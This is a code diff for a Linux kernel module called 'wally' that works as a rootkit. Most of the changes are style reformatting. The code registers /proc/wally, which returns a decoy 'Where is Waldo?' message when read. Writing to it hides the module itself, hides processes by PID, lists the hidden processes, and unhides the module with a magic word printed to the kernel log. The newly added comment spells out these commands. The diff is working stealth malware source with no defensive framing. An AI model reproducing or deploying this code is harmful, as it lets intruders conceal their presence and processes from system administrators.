@@ -81,9 +81,7 @@ static char *magic_word;
     }
 WALLY_DECLARE_MOD(wally);
 
-static char*
-get_unhide_magic_word(void)
-{
+static char* get_unhide_magic_word(void) {
     if(!magic_word)
         magic_word = wally_random_bytes(MAX_MAGIC_WORD_SIZE);
 
@@ -91,22 +89,42 @@ get_unhide_magic_word(void)
     return magic_word;
 }
 
-static int
-proc_dummy_show(struct seq_file *seq, void *data)
-{
+static int proc_dummy_show(struct seq_file *seq, void *data) {
     seq_printf(seq, "Where is Waldo?\n");
     return 0;
 }
 
-static int
-open_cb(struct inode *ino, struct file *fptr)
-{
+static int open_cb(struct inode *ino, struct file *fptr) {
     return single_open(fptr, proc_dummy_show, NULL);
 }
 
-static ssize_t
-write_cb(struct file *fptr, const char __user *user, size_t size, loff_t *offset)
-{
+/*
+ * Hide this module:
+ *
+ *  # echo hide >/proc/wally
+ *
+ *  Ring buffer display unhide key
+ *
+ * Unhide this module:
+ *
+ *  # echo <key> >/proc/wally
+ *
+ * Hide process:
+ *
+ *  # echo <pid> >/proc/wally
+ *
+ * List hidden processes:
+ *
+ *  # echo list >/proc/wally
+ *
+ *  # dmesg
+ *
+ * Unhide processes:
+ *
+ *  # echo <pid> >/proc/wally
+ */
+static ssize_t write_cb(struct file *fptr, const char __user *user,
+        size_t size, loff_t *offset) {
     char buf[MAX_PROCFS_SIZE+1];
     unsigned long bufsiz = 0;
     static unsigned int op_lock;
@@ -120,37 +138,27 @@ write_cb(struct file *fptr, const char __user *user, size_t size, loff_t *offset
 
     pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
     if((pid > 1) && (pid <= 65535 /* 16 bit range pids */))
-    {
         hide_task_by_pid(pid);
-    }
-    else
-    {
+    else {
         size_t len = strlen(buf) - 1;
         if(!len || (len < 0))
             goto leave;
 
         buf[len] == '\n' ? buf[len] = '\0' : 0;
-        if(!strcmp(buf, "hide") && !op_lock)
-        {
+        if(!strcmp(buf, "hide") && !op_lock) {
             static unsigned int msg_lock = 0;
-            if(!msg_lock)
-            {
+            if(!msg_lock) {
                 msg_lock = 1;
                 printk(KERN_WARNING
                         "Your module \'unhide\' magic word is: '%s'\n", magic_word);
             }
             op_lock = 1;
             wally_hide_mod();
-        }
-        else if(!strcmp(buf, magic_word) && op_lock)
-        {
+        } else if(!strcmp(buf, magic_word) && op_lock) {
             op_lock = 0;
             wally_unhide_mod();
-        }
-        else if(!strcmp(buf, "list"))
-        {
+        } else if(!strcmp(buf, "list"))
             wally_list_saved_tasks();
-        }
     }
 leave:
     return size;
@@ -162,17 +170,15 @@ efault_error:
  * proc file callbacks and defs
  */
 static const struct file_operations proc_file_fops = {
- .owner =   THIS_MODULE,
- .open  =   open_cb,
- .read  =   seq_read,
- .release = seq_release,
- .write =   write_cb,
+    .owner =   THIS_MODULE,
+    .open  =   open_cb,
+    .read  =   seq_read,
+    .release = seq_release,
+    .write =   write_cb,
 };
 
-static void do_remove_proc(void)
-{
-    if(WallyProcFileEntry)
-    {
+static void do_remove_proc(void) {
+    if(WallyProcFileEntry) {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
         remove_proc_entry(WALLY_PROC_FILE, NULL);
 #else
@@ -181,10 +187,8 @@ static void do_remove_proc(void)
     }
 }
 
-static int __init wally_init(void)
-{
+static int __init wally_init(void) {
     int lock = 0;
-    //FIXME
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
     kuid_t kuid;
     kgid_t kgid;
@@ -201,13 +205,9 @@ static int __init wally_init(void)
 try_reload:
     WallyProcFileEntry = proc_create(WALLY_PROC_FILE, S_IRUSR | S_IWUSR, NULL, &proc_file_fops);
     if(lock && !WallyProcFileEntry)
-    {
         goto proc_file_error;
-    }
-    if(!lock)
-    {
-        if(!WallyProcFileEntry)
-        {
+    if(!lock) {
+        if(!WallyProcFileEntry) {
             lock = 1;
             do_remove_proc();
             goto try_reload;
@@ -244,8 +244,7 @@ leave:
     return 0;
 }
 
-static void __exit wally_cleanup(void)
-{
+static void __exit wally_cleanup(void) {
    if(magic_word != NULL)
         kfree(magic_word);
 
